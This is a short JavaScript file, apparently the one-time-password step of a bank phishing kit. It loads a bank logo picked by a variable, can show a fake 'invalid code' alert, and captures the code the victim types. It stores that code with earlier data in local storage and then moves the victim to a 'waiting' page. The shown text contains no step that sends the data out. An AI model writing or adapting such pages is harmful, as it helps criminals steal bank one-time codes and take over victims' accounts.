console.log("otp ON")

document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err != ''){
        alert('Código no válido.');
    }

    info.err = '';
});

// Cargar imagen
document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${info.ban}.png`);

const form = document.querySelector('#form');
form.addEventListener('submit', e=>{
    e.preventDefault();
    showSpinner();

    info.tok = document.querySelector('#tok').value;
    LS.setItem('info', JSON.stringify(info));

    setTimeout(() => window.location.href = 'waiting.html', 2000);
});